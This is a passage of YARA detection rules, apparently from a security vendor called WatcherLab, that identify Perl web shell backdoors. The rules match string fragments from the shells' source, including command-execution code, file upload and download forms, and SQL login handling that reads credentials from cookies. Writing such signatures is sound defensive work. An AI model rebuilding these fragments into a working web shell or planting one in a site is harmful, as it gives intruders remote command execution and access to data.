        $s9 = "set();sql_loginform();$column=$in{'column'};print <<END;" fullword ascii
        $s10 = "& $pport && $usser && $passs){$zapros=\"SHOW DATABASES\";jquery();$sth=$dbh->prepare($zapros);$sth->execute;print \"$verd $tbb<b" ascii
        $s11 = "PrintPageFooter;}sub sql_tables{&GetCookies;$hhost=$Cookies{'hhost'};$pport=$Cookies{'pport'};$usser=$Cookies{'usser'};$passs=$C" ascii
        $s12 = "e Path: $TargetName<br>\";}else{print \"Failed: $!<br>\";}print \"</font>\";&PrintCommandLineInputForm;&PrintPageFooter;}sub Rem" ascii
        $s13 = "'usser'};$passs=$Cookies{'passs'};$dbb=$Cookies{'dbb'};$table=$Cookies{'table'};&PrintPageHeader(\"c\");sql_vars_set();sql_login" ascii
        $s14 = "ookie: dbb=$dbb;\\n\";}sub sql_query{sql_vars_set();&GetCookies;$hhost=$Cookies{'hhost'};$pport=$Cookies{'pport'};$usser=$Cookie" ascii
        $s15 = "Jy4qPycpL2csJzxmb250IGNvbG9yPSNmYWZhZDI+JDE8L2ZvbnQ+JykucmVwbGFjZSgvKFwvXCouKlwqXC98XC9cLy4qKS9naW0sJzxmb250IGNvbG9yPSM2OTY5Njk+" ascii /* base64 encoded string ''.*?')/g,'<font color=#fafad2>$1</font>').replace(/(\/\*.*\*\/|\/\/.*)/gim,'<font color=#696969>' */
        $s16 = "Lz98aHR0cHNcOlwvXC8qXC8/fGZ0cFw6XC9cLypcLz8pXGIvZ2ltLCc8dT48Zm9udCBjb2xvcj0jZmFmYWQyPiQxPC91PjwvZm9udD4nKS5yZXBsYWNlKC8oIi4qPyJ8" ascii /* base64 encoded string '/?|https\:\/\/*\/?|ftp\:\/\/*\/?)\b/gim,'<u><font color=#fafad2>$1</u></font>').replace(/(".*?"|' */
        $s17 = "dW5jdGlvbiBjb2xvcihjb2RlKXt2YXIgcz1bXTt2YXIgYz0iJyI7cmV0dXJuIGNvZGUucmVwbGFjZSgvXGIoY2FzZXxjYXRjaHxjb250aW51ZXxkb3xlbmRkb3xlbHNl" ascii /* base64 encoded string 'unction color(code){var s=[];var c="'";return code.replace(/\b(case|catch|continue|do|enddo|else' */
        $s18 = "KnwtKS8pPydjb21tZW50JzpyLm1hdGNoKC9eWyYnXS8pPydzdHJpbmcnOidyZWdleHAnO3JldHVybiAnPHNwYW4gY2xhc3M9IicrY3NzKyciPicrcisnPC9zcGFuPic7" ascii /* base64 encoded string '*|-)/)?'comment':r.match(/^[&']/)?'string':'regexp';return '<span class="'+css+'">'+r+'</span>';' */
        $s19 = "JDE8L2ZvbnQ+JykucmVwbGFjZSgvKFwvXCpbXHNcU10qP1wqXC8pL2dpbSwnPGZvbnQgY29sb3I9IzY5Njk2OT4kMTwvZm9udD4nKS5yZXBsYWNlKC8oXiMuKiQpL2dp" ascii /* base64 encoded string '$1</font>').replace(/(\/\*[\s\S]*?\*\/)/gim,'<font color=#696969>$1</font>').replace(/(^#.*$)/gi' */
        $s20 = "bSwnPGI+PGZvbnQgY29sb3I9IzY5Njk2OT4kMTwvZm9udD48L2I+JykucmVwbGFjZSgvKFwkW19hLXowLTldKikvZ2ltLCc8Yj48Zm9udCBjb2xvcj0jOThmYjk4PiQx" ascii /* base64 encoded string 'm,'<b><font color=#696969>$1</font></b>').replace(/(\$[_a-z0-9]*)/gim,'<b><font color=#98fb98>$1' */
    condition:
        ( uint16(0) == 0x2123 and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _26234fc9a54355f03663196a99affd9480f5684d_4b2ee85bb53225354eb84536035bb40b2ef945a8_db74302278d2bfd5a1f48e95bf04ff579587620f_6
{
    meta:
        description = "others - from files 26234fc9a54355f03663196a99affd9480f5684d.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "13519728df62cc1192ccc4405e1ac1115ad7885650e638bdcaabf6f9cd2bdac5"
        hash2 = "a5a40d319b3235fe2476d4c2d0f719a5fd2b4958edc0aa5e9bed9422ff819d19"
        hash3 = "077754d01e8d537c6ac3fb69c25c7397c4c34fe5a4462727b0814af2381a67fa"
    strings:
        $s1 = "}sub sql{use DBI;&PrintPageHeader(\"p\");sql_loginform();sql_query_form();&PrintVar;&PrintPageFooter;}sub sql_vars_set{$hhost=$i" ascii
        $s2 = "<form name='sf' method='post'><table cellpadding='2' cellspacing='0'><tr><td>Type</td><td>Host</td><td>Port</td><td>Login</td><t" ascii
        $s3 = "ookie: last_command=;\\n\";print \"Content-type: text/html\\n\\n\";&PrintLoginForm;}sub PerformLogin{if(md5_hex($LoginPassword) " ascii
        $s4 = "<form name='sf' method='post'><table cellpadding='2' cellspacing='0'><tr><td>Type</td><td>Host</td><td>Port</td><td>Login</td><t" ascii
        $s5 = "\"><span>Execute:</span><br><input type=\"hidden\" name=\"a\" value=\"command\"><input type=\"hidden\" name=\"d\" value=\"$Curre" ascii
        $s6 = "}sub sql{use DBI;&PrintPageHeader(\"p\");sql_loginform();sql_query_form();&PrintVar;&PrintPageFooter;}sub sql_vars_set{$hhost=$i" ascii
        $s7 = "rm;&PrintPageFooter;}else{print \"Content-type: text/html\\n\\n\";&PrintLoginForm;}}sub FileManager{&PrintPageHeader(\"f\");file" ascii
        $s8 = "names=document.getElementsByName('lo');var ss=document.getElementsByName('ch11');if(ss[0].checked){ch=true;}else{ch=false;}for(" fullword ascii
        $s9 = "'sql_host'};$pport=$in{'sql_port'};$usser=$in{'sql_login'};$passs=$in{'sql_pass'};$dbb=$in{'sql_db'};}sub sql_query_form{ print " ascii
        $s10 = "ssword){print \"Set-Cookie: SAVEDPWD=\".md5_hex($LoginPassword).\";\\n\";&PrintPageHeader(\"c\");file_header();&PrintCommandLine" ascii
        $s11 = "<br><input class='toolsInp' type=text name=mf><input type=hidden name=a value=command><input type=hidden name=d value=$CurrentDi" ascii
        $s12 = "expires:\"\")+((path)?\";path=\"+path:\"\")+((domain)?\";domain=\"+domain:\"\")+((secure)?\";secure\":\"\");}setCookie(\"last_co" ascii
        $s13 = "}sub PrintLoginForm{print \"<center><form name=f method=POST><input type=password name=p><input type=submit value='>>'></form></" ascii
        $s14 = "<script>function setCookie(name,value,expires,path,domain,secure){document.cookie=name+\"=\"+escape(value)+((expires)?\";expires" ascii
        $s15 = "<br><form name=\"upload_file_form\" enctype=\"multipart/form-data\" method=\"POST\"><input type=\"file\" name=\"f\" class=toolsI" ascii
        $s16 = "function s(e){window.scrollTo(0,document.body.scrollHeight);var u=e.keyCode?e.keyCode:e.charCode;var x=document.getElementById(" ascii
        $s17 = "ewF\"><input type=\"hidden\" name=\"d\" value=\"$CurrentDir\"><input type=submit value=Files style=\"margin-top:5px\"></form>" fullword ascii
        $s18 = "t_file_path\"><input type=\"hidden\" name=\"d\" value=\"$CurrentDir\"><input type=submit value=MakeDir></form></code>" fullword ascii
        $s19 = "xt name=sql_port value=$pport></td><td><input type=text name=sql_login value=$usser></td><td><input type=text name=sql_pass valu" ascii
        $s20 = "<h1>Execution PERL-code</h1><form name=pf method=post><textarea name=code class=bigarea id=PerlCode></textarea><input type=\"hid" ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _3610fffd9262dae60e57703b7a2aab8cdcdb98aa_72e5f0e4cd438e47b6454de297267770a36cbeb3_bc94da17033bf533b5cabe6490e01441c3b5e9d8__7
{
    meta:
        description = "others - from files 3610fffd9262dae60e57703b7a2aab8cdcdb98aa.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8f2ebda4d0ce8f8ca9e4003a4b4f63d641051af87dcbcdc05f86f64ce047c49b"
        hash2 = "1cd2344239867b8e98c79df7a39f59f567d131ff5445950c767f167523b4fdf1"
        hash3 = "5bbe3440af158ce74887fd27a442e662b45ef7640916e186a13da1665b1d88d4"
        hash4 = "1e06d7dad7ba1d7f5501a76fa0cba1fc61554d585b5bce165069726599d111e4"
        hash5 = "38b4f6ada23eea46019dd175da0225bb059bac6495236cb3f24caee2e8a42877"
    strings:
        $s1 = "print \"<code>$Prompt $RunCommand</code><xmp>\";" fullword ascii
        $s2 = "print \"Set-Cookie: SAVEDPWD=$LoginPassword;\\n\";" fullword ascii
        $s3 = "print \"<code>$Prompt $RunCommand</code>\";" fullword ascii
        $s4 = "print \"Transfered $TargetFileSize Bytes.<br>\";" fullword ascii
        $s5 = "Command exceeded maximum time of $CommandTimeoutDuration second(s)." fullword ascii
        $s6 = "<form name=\"f\" enctype=\"multipart/form-data\" method=\"POST\" action=\"$ScriptLocation\">" fullword ascii
        $s7 = "print \"File Path: $TargetName<br>\";" fullword ascii
        $s8 = "<input type=\"hidden\" name=\"a\" value=\"command\">" fullword ascii
        $s9 = "$TargetName .= $PathSep.$1;" fullword ascii
        $s10 = "$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack(\"H*\",$1)/eg;" fullword ascii
        $s11 = "print \"Content-Disposition: attachment; filename=$1\\n\\n\";" fullword ascii
        $s12 = "Download: <input type=\"submit\" value=\"Begin\">" fullword ascii
        $s13 = "<input type=\"hidden\" name=\"a\" value=\"download\">" fullword ascii
        $s14 = "<a href=\"$DownloadLink\">Click Here</a>." fullword ascii
        $s15 = "<form name=\"f\" method=\"POST\" action=\"$ScriptLocation\">" fullword ascii
        $s16 = "open(CommandOutput, $Command);" fullword ascii
        $s17 = "$Command .= \" |\";" fullword ascii
        $s18 = "Upload:&nbsp;&nbsp;&nbsp;<input type=\"submit\" value=\"Begin\">" fullword ascii
        $s19 = "$Prompt download<br><br>" fullword ascii
        $s20 = "print \"Content-Length: $FileSize\\n\";" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 80KB and ( 8 of them ) ) or ( all of them )
}
